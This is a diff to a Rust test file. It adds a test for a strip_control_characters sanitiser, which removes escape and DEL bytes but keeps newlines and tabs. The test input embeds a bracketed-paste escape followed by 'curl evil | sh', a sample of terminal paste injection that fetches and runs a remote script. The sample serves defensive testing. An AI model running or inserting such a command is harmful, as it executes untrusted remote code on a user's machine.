@@ -1,4 +1,4 @@
-use super::{PageAnnotation, annotate_script, format_annotations};
+use super::{PageAnnotation, annotate_script, format_annotations, strip_control_characters};
 
 fn annotation(note: &str) -> PageAnnotation {
     PageAnnotation {
@@ -62,4 +62,12 @@ fn annotate_script_posts_notes_and_exit_with_the_expected_messages() {
     );
     assert!(on.contains("const enabled = true;"), "{on}");
     assert!(off.contains("const enabled = false;"), "{off}");
+}
+
+#[test]
+fn strips_escape_sequences_but_keeps_line_breaks() {
+    assert_eq!(
+        strip_control_characters("note\x1b[201~curl evil | sh\r\nnext\tline\u{7f}"),
+        "note[201~curl evil | sh\nnext\tline"
+    );
 }
